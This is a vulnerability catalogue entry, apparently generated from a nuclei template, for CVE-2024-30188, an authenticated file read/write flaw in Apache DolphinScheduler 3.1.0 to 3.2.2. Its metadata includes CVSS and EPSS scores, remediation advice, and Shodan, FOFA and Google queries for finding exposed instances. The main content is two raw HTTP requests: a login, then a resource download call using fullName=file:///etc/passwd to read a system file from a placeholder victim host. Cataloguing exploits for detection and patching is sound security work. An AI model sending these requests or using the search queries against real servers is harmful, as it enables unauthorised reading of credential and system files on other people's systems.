---
layout: post
cve_id: CVE-2024-30188
title: Apache DolphinScheduler >= 3.1.0, < 3.2.2 Resource File Read And Write
pcap: true
pcap_path: /pcaps/2024/CVE-2024-30188.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-30188.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,rootxharsh,pdresearch
severity: high
impact: 'Attackers can read and write arbitrary resource files, potentially compromising
  system integrity and confidentiality.

  '
remediation: 'Update Apache DolphinScheduler to a version that patches the resource
  file access vulnerability.

  '
reference:
- https://github.com/advisories/GHSA-4vv4-crw4-8pcw
- https://github.com/Mr-xn/Penetration_Testing_POC
- https://nvd.nist.gov/vuln/detail/CVE-2024-30188
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
  cvss-score: 8.1
  cve-id: CVE-2024-30188
  epss-score: 0.88243
  epss-percentile: 0.99463
  cpe: cpe:2.3:a:apache:dolphinscheduler:*:*:*:*:*:*:*:*
metadata:
  max-request: 2
  verified: true
  vendor: apache
  product: dolphinscheduler
  shodan-query: http.title:"dolphinscheduler"
  fofa-query: title="dolphinscheduler"
  google-query: intitle:"dolphinscheduler"
tags:
- cve
- cve2024
- dolphinscheduler
- lfi
- apache
- authenticated
- vuln
---

## ðŸ” Vulnerability Description
File read and write vulnerability in Apache DolphinScheduler, authenticated users can illegally access additional resource files. This issue affects Apache DolphinScheduler from 3.1.0 before 3.2.2.


## ðŸŒ HTTP Request
```nohighlight
POST /dolphinscheduler/login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15
Content-Length: 50
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
userName=LoimJx&userPassword=WImB1jmQ&ssoLoginUrl=
```

```nohighlight
GET /dolphinscheduler/resources/download?fullName=file:///etc/passwd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Connection: close
sessionId: wCk9gS
Accept-Encoding: gzip
```

